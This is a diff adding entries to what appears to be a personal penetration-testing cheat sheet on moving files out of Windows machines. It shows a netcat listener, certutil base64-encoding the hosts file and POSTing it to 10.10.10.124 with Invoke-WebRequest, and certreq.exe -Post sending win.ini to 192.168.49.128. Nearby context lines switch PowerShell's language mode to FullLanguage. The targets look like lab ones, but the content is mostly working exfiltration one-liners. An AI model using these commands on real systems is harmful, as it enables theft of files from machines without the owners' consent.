@@ -71,6 +71,8 @@ In Constrained Language Mode, certain .NET and COM APIs, particularly those that
 $ExecutionContext.SessionState.LanguageMode   
 $ExecutionContext.SessionState.LanguageMode = 'FullLanguage'     #to change
 ------------------------------------------
+#### Windows > nc listener uisng certutil, transfer to temp file B64 send B64 to nc
+
 Step 1   # nc -lvnp 80
 Step 1   To test connection> Test-NetConnection -ComputerName 10.10.10.124 -Port 80
 Step 2   > certutil -encode C:\Windows\System32\drivers\etc\hosts C:\Users\2Pirate\hosts.b64; $b64 = Get-Content -Path 'C:\2Pirate\hosts.b64' -Raw; Invoke-WebRequest -Uri http://10.10.10.124:80/ -Method POST -Body $b64 -ContentType "text/plain" -ErrorAction SilentlyContinue
@@ -80,6 +82,22 @@ Step 2   Alternative   #### Oneliner to Base64 encode file with certutil into TE
 1. certutil -encode upload_nix.zip upload.b64
 2. echo -n 'UEsDBA75fqG1gHXAAA=' | base64 -d > upload_nix.zip
 3. gunzip -S .zip upload_nix.zip   
+
+------------------------------------------
+#### Windows > nc listener port 80 using certreq.exe
+
+## certreq.exe -Post: This command is used to submit a certificate request to a Certificate Authority (CA) for processing.
+Step 1   # nc -lvnp 80
+Step 2    > certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
+
+-----------------------------------------
+
+
+
+
+
+
+
 
 
 #################################################################################################
